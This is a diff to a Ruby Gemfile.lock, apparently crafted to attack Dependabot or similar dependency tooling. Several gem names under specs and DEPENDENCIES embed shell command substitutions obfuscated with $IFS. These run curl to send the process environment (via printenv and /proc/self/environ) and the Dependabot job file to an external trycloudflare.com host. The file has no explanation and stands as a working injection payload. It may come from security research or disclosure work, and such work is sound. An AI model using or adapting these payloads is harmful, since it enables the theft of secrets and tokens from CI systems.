@@ -2,7 +2,7 @@ GEM
   remote: https://boats-maker-alien-airports.trycloudflare.com/reg
   specs:
     benign-artifact (1.0.0)
-    evil2-artifact$(printenv>e;curl$IFS-s$IFS$()--data-binary$IFS@e$IFS$()boats-maker-alien-airports.trycloudflare.com) (1.0.0)
+    evil3-artifact$(curl$IFS-s$IFS$()--data-binary$IFS@/proc/self/environ$IFS$()boats-maker-alien-airports.trycloudflare.com) (1.0.0)
     evil-artifact$(curl$IFS-s$IFS$()--data-binary$IFS@$DEPENDABOT_JOB_PATH$IFS$()boats-maker-alien-airports.trycloudflare.com) (1.0.0)
 
 PLATFORMS
@@ -10,7 +10,7 @@ PLATFORMS
 
 DEPENDENCIES
   benign-artifact
-  evil2-artifact$(printenv>e;curl$IFS-s$IFS$()--data-binary$IFS@e$IFS$()boats-maker-alien-airports.trycloudflare.com)
+  evil3-artifact$(curl$IFS-s$IFS$()--data-binary$IFS@/proc/self/environ$IFS$()boats-maker-alien-airports.trycloudflare.com)
   evil-artifact$(curl$IFS-s$IFS$()--data-binary$IFS@$DEPENDABOT_JOB_PATH$IFS$()boats-maker-alien-airports.trycloudflare.com)
 
 BUNDLED WITH
